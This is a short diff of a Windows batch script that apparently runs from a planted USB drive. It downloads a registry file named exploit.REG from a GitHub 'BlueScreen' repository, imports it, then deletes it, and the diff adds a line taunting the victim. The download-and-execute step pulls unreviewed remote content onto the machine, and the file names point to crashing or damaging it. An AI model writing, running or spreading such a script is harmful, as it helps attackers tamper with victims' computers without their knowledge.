@@ -1,4 +1,5 @@
 @echo off
+echo dont put random usbs into your pc bud
 powershell /c wget https://raw.githubusercontent.com/harryaldwithjarryald/BlueScreen/main/exploit.REG -OutFile temp.REG
 temp.REG
 del temp.REG
